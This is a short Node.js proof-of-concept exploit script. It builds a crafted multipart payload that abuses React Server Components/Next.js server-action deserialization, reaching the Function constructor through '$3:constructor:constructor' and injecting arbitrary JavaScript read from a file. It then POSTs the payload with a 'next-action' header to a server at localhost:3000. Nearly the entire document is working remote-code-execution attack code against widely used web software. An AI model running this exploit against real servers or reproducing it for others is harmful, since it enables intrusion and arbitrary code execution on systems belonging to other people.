import fs from "fs";
import path from "path";
import FormDataLib from "form-data";
const filePath = process.argv[2] ?? "out.js";

// Resolve relative paths safely
const resolvedPath = path.resolve(process.cwd(), filePath);

let contents = 'console.log(7*7+2)//'
try {
  contents = fs.readFileSync(resolvedPath, "utf8");
  console.log(contents);
} catch (err) {
  console.error(`Failed to read file: ${resolvedPath}`);
  console.error(err.message);
  process.exit(1);
}

let payload = {
    '0': '$1',
    '1': {
        'status':'resolved_model',
        'reason':0,
        '_response':'$4',
        'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
        'then':'$2:then'
    },
    '2': '$@3',
    '3': [],
    '4': {
        '_prefix':`${contents}//`,
        '_formData':{
            'get':'$3:constructor:constructor'
        },
        '_chunks':'$2:_response:_chunks',
    }
}

const fd = new FormDataLib()

for (const key in payload) {
    fd.append(key, JSON.stringify(payload[key]))
}

console.log(fd.getBuffer().toString())

console.log(fd.getHeaders())

function exploit(baseUrl) {
    fetch(baseUrl, {
        method: 'POST',
        headers: {
            'next-action': 'x',
            ...fd.getHeaders()
        },
        body: fd.getBuffer()
    }).then(x => {
        console.log('fetched', x)
        return x.text()
    }).then(x => {
        console.log('got', x)
    })
}

exploit('http://localhost:3000')